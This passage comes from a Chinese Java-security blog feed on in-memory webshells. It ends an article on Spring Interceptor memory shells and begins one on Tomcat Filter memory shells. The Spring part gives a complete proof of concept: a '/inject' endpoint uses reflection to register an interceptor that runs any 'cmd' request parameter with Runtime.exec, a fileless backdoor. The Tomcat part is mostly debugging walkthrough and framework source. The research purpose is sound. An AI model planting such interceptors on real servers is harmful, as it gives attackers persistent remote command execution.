<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-4-动态注册Interceptor"><a href="#2-3-4-动态注册Interceptor" class="headerlink" title="2.3.4 动态注册Interceptor"></a>2.3.4 动态注册Interceptor</h4><p>我们知道Spring是通过遍历adaptedInterceptors属性值来执行Interceptor的，因此最后我们只需要将恶意Interceptor加入到 <code>adaptedInterceptors</code> 属性值中就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将恶意Interceptor添加入adaptedInterceptors</span><br><span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shell_interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>adaptedInterceptors.add(shell_interceptor);<br></code></pre></td></tr></table></figure><h4 id="2-3-5-完整-POC"><a href="#2-3-5-完整-POC" class="headerlink" title="2.3.5 完整 POC"></a>2.3.5 完整 POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.controller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_interceptor_controller</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/inject&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Inject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//获取上下文环境</span><br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet) filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br><br>        <span class="hljs-comment">//获取adaptedInterceptors属性值</span><br>        org.springframework.web.servlet.handler.<span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">abstractHandlerMapping</span> <span class="hljs-operator">=</span> (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);<br><br>        <span class="hljs-comment">//将恶意 Interceptor添加入 adaptedInterceptors</span><br>        <span class="hljs-type">ShellInterceptor</span> <span class="hljs-variable">shellInterceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShellInterceptor</span>();<br>        adaptedInterceptors.add(shellInterceptor);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518658.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518094.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081521076.png" alt="img"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p><p><a href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p><p>[基础篇 - Javassist 使用指南](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 内存马第二篇 - Tomcat 内存马</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%BA%8C%E7%AF%87%20-%20Tomcat%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-内存马第二篇-Tomcat-内存马"><a href="#Java-内存马第二篇-Tomcat-内存马" class="headerlink" title="Java 内存马第二篇 - Tomcat 内存马"></a>Java 内存马第二篇 - Tomcat 内存马</h1><h1 id="二、Tomcat-内存马"><a href="#二、Tomcat-内存马" class="headerlink" title="二、Tomcat 内存马"></a>二、Tomcat 内存马</h1><h2 id="1-Filter-内存马"><a href="#1-Filter-内存马" class="headerlink" title="1. Filter 内存马"></a>1. Filter 内存马</h2><p>Filter 我们称之为过滤器，是 Java 中最常见也最实用的技术之一，通常被用来处理静态 web 资源、访问权限控制、记录日志等附加功能等等。一次请求进入到服务器后，将先由 Filter 对用户请求进行预处理，再交给 Servlet。</p><p>通常情况下，Filter 配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p><ol><li>使用 ServletContext 的 addFilter&#x2F;createFilter 方法注册；</li><li>使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册（将会在 Listener 中进行描述）；</li><li>使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态，后面会描述）。</li></ol><h3 id="1-1-环境创建"><a href="#1-1-环境创建" class="headerlink" title="1.1 环境创建"></a>1.1 环境创建</h3><p>web.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.src.tomcatdemo.FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>自定义一个 Filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter launch&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;The filtering operation was performed\n&quot;</span>);<br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514652.png" alt="img"></p><h3 id="1-2-流程分析"><a href="#1-2-流程分析" class="headerlink" title="1.2 流程分析"></a>1.2 流程分析</h3><h4 id="在访问-filter-之后的流程分析"><a href="#在访问-filter-之后的流程分析" class="headerlink" title="在访问 &#x2F;filter 之后的流程分析"></a>在访问 &#x2F;filter 之后的流程分析</h4><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">filterChain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(servletRequest, servletResponse);<br></code></pre></td></tr></table></figure><p>断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514811.png" alt="img"></p><p>ApplicationFilterChain.dofilter</p><p><strong>安全检查</strong>：如果启用了安全管理器(<code>Globals.IS_SECURITY_ENABLED</code>)，则在特权上下文中执行</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514397.png" alt="img"></p><p><strong>执行</strong>：实际过滤逻辑在<code>internalDoFilter</code>方法中完成</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514231.png" alt="img"></p><p>此时的 filter 中有俩个值：</p><p>0 是我们自定义的 FilterTest</p><p>1 是 tomcat 自带的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513150.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514013.png" alt="img"></p><p>调用了<code>filter.doFilter()</code>，而<code>filter</code>是通过<code>filterConfig.getFilter()</code>得到的，<code>filterConfig</code>定义如下</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514958.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081532696.png" alt="img"></p><h5 id="总的来说："><a href="#总的来说：" class="headerlink" title="总的来说："></a>总的来说：</h5><p>最后一个 filter 调用 servlet 的 service 方法</p><p>上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法；</p><p>最后一个 Filter.doFilter() 方法中调用的 FilterChain.doFilter() 方法将调用目标 Servlet.service() 方法。</p><p>只要 Filter 链中任意一个 Filter 没有调用 <code>FilterChain.doFilter()</code> 方法，则目标 <code>Servlet.service()</code> 方法都不会被执行。</p><h4 id="在访问-filter-之前的流程分析"><a href="#在访问-filter-之前的流程分析" class="headerlink" title="在访问 &#x2F;filter 之前的流程分析"></a>在访问 &#x2F;filter 之前的流程分析</h4><p>filter是如何被创建并注册的</p><p>之前的流程：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514435.png" alt="img"></p><p>进入 StandardWrapperValve.invoke</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513163.png" alt="img"></p><p>这个函数中有 creatFilterChain</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513308.png" alt="img"></p><p>一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的<code>filters</code>属性是一个ApplicationFilterConfig数组。我们来寻找一下<code>ApplicationFilterChain.filters</code>属性在哪里被赋值。</p><p>在<code>StandardWrapperValve#invoke()</code>方法中，通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化了一个<code>ApplicationFilterChain</code>类</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513147.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterFactory</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;<br><br>        <span class="hljs-comment">// If there is no servlet to execute, return null</span><br>        <span class="hljs-keyword">if</span> (servlet == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Create and initialize a filter chain object</span><br>        ApplicationFilterChain filterChain;<br>        <span class="hljs-keyword">if</span> (request <span class="hljs-keyword">instanceof</span> Request) &#123;<br>            <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) request;<br>            <span class="hljs-keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;<br>                <span class="hljs-comment">// Security: Do not recycle</span><br>                filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                filterChain = (ApplicationFilterChain) req.getFilterChain();<br>                <span class="hljs-keyword">if</span> (filterChain == <span class="hljs-literal">null</span>) &#123;<br>                    filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>                    req.setFilterChain(filterChain);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Request dispatcher in use</span><br>            filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>        &#125;<br><br>        <span class="hljs-comment">// 创建 filterChain </span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br><br>        <span class="hljs-comment">// Acquire the filter mappings for this Context</span><br>        <span class="hljs-comment">//wrapper.getParent() 获取 StandardContext 对象</span><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>        <span class="hljs-comment">//获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<br><br>        <span class="hljs-comment">// If there are no filter mappings, we are done</span><br>        <span class="hljs-keyword">if</span> (filterMaps == <span class="hljs-literal">null</span> || filterMaps.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> filterChain;<br>        &#125;<br><br>        <span class="hljs-comment">// Acquire the information we will need to match filter mappings</span><br>        <span class="hljs-type">DispatcherType</span> <span class="hljs-variable">dispatcher</span> <span class="hljs-operator">=</span> (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> FilterUtil.getRequestPath(request);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br><br>        <span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!FilterUtil.matchFiltersURL(filterMap, requestPath)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">//在StandardContext中获取FilterConfig</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>                log.warn(sm.getString(<span class="hljs-string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, filterMap.getFilterName()));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">//将一个filterConfig添加到filterChain中</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br><br>        <span class="hljs-comment">// Add filters that match on servlet name second</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>                log.warn(sm.getString(<span class="hljs-string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, filterMap.getFilterName()));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            filterChain.addFilter(filterConfig);<br>        &#125;<br><br>        <span class="hljs-comment">// Return the completed filter chain</span><br>        <span class="hljs-keyword">return</span> filterChain;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="小结：filterChain对象的创建过程"><a href="#小结：filterChain对象的创建过程" class="headerlink" title="小结：filterChain对象的创建过程"></a>小结：filterChain对象的创建过程</h4><ol><li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的 filterChain 对象</li><li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li><li>接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</li><li>最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code></li><li>通过<code>filterChain.addFilter(filterConfig)</code>将一个<code>filterConfig</code>添加到<code>filterChain</code>中</li></ol><p>跟进到 createFilterChain 函数中，我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了<strong>filterConfigs、filterDefs、filterMaps</strong></p><p><strong>filterConfigs:包含所有与过滤器对应的filterDef信息及过滤器实例，进行过滤器进行管理</strong></p><p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p><p><strong>filterDef</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">filterDef`必要的属性为`filter`、`filterClass`以及`filterName<br></code></pre></td></tr></table></figure><p>filterDef 就是对应 web.xml 中的 filter 标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>filterDefs:包含所有过滤器包括实例内部等变量</strong> </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 